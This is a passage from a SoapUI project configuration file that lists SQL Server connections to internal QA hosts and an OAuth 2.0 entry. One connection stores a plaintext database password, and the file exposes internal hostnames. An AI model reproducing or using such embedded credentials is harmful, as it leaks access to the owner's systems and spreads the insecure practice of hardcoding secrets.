perties/></con:databaseConnection><con:databaseConnection><con:name>ETLMgt</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB111.rb.local:1433;databaseName=ETLMgt;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>QaAutomation</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/></con:databaseConnection><con:databaseConnection><con:name>EPCSvc</con:name><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=EPCSvc;integratedSecurity=true;</con:connectionString><con:password>Redbox1!</con:password><con:connectionProperties/></con:databaseConnection></con:databaseConnectionContainer><con:jmsConnectionContainer/></con:environment><con:authRepository><con:oAuth20AuthEntry><con:name>client_credentials</con:name><con:type>OAuth 2.0</con:type><con:accessTokenPosition>HEADER</con:accessTokenPosition><con:oAuth2Flow>AUTHORIZATION_CODE_GRANT</con:oAuth2Flow><con:refreshAccessTokenMethod>AUTOMATIC</con:refreshAccessTokenMethod><con:responseType>id_token</con:responseType></con:oAuth20AuthEntry></con:authRepository><con:environmentSpec><con:entry environmentId="4af3fc93-9685-42bf-a07f-496268228e70"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec><con:tags/></con:soapui-project>